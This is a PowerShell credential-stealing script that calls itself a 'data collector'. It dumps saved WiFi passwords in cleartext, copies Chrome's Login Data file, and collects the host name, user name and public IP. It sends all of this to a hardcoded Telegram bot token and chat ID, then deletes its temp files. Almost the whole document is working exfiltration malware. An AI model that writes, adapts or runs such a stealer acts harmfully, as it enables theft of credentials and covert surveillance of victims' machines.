<#
.SYNOPSIS
    Ultimate Data Collector v5.1
.DESCRIPTION
    Collects and sends real data: WiFi passwords, browser logins
#>

$BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null

function Send-ToTelegram {
    param([string]$Text)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ chat_id = $CHAT_ID; text = $Text }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
    } catch { 
        Write-Output "[ERROR] Telegram send failed: $_"
    }
}

function Get-WiFiPasswords {
    $output = @()
    try {
        $profiles = (netsh wlan show profiles) | Where-Object { $_ -match "All User Profile" } | ForEach-Object {
            $_.Split(":")[1].Trim()
        }

        foreach ($profile in $profiles) {
            try {
                $profileInfo = netsh wlan show profile name="`"$profile`"" key=clear
                $password = ($profileInfo | Select-String "Key Content").Line.Split(":")[1].Trim()
                $output += "WiFi: $profile"
                $output += "Password: $password"
                $output += "----------------"
            } catch {
                $output += "Error with profile: $profile"
            }
        }
    } catch {
        $output += "Failed to get WiFi passwords"
    }
    return $output -join "`n"
}

function Get-ChromeCredentials {
    $output = @()
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    
    if (Test-Path $chromePath) {
        try {
            $tempCopy = "$TEMP_DIR\ChromeLoginData"
            Copy-Item $chromePath $tempCopy -Force

            # SQLite extraction would go here
            $output += "Chrome data requires SQLite processing"
            $output += "File copied to: $tempCopy"
            
        } catch {
            $output += "Chrome data error: $_"
        }
    } else {
        $output += "Chrome data not found"
    }
    return $output -join "`n"
}

# Main collection
try {
    $report = @()
    
    # 1. Get WiFi passwords
    $wifiData = Get-WiFiPasswords
    if ($wifiData) {
        Send-ToTelegram -Text "=== WiFi PASSWORDS ===`n$wifiData"
    }

    # 2. Get Chrome data
    $chromeData = Get-ChromeCredentials
    if ($chromeData) {
        Send-ToTelegram -Text "=== CHROME DATA ===`n$chromeData"
    }

    # 3. Send system info
    $sysInfo = @(
        "=== SYSTEM INFO ===",
        "Computer: $env:COMPUTERNAME",
        "User: $env:USERNAME",
        "IP: $(try {(Invoke-WebRequest -Uri 'https://api.ipify.org').Content} catch {'Unknown'})"
    ) -join "`n"
    
    Send-ToTelegram -Text $sysInfo

} catch {
    Send-ToTelegram -Text "ERROR: $_"
} finally {
    Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
}
